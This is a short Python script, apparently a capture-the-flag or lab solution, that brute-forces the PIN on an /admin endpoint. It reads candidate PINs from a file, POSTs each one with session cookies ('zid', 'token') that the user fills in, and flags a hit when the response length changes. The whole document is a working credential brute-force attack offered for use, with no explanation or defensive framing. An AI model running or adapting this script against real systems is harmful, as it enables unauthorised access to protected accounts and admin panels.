# fill in the relevant fields for the cookies dict before running

import requests
import sys

cookies={'zid': '', 'token': ''}

with open(sys.argv[1], 'r') as f:
    i = 0
    lines = f.readlines()
    total = str(len(lines))
    for line in lines:
        i += 1
        number = line.strip()
        r = requests.post('http://drive.bing.ns.agency/admin', data={'pin': number}, cookies=cookies)
        if len(r.text) != 2143:
            print('SUCCESS (' + str(i) + '/' + total + '): ' + number)
            break
        else:
            print('FAILURE (' + str(i) + '/' + total + '): ' + number)
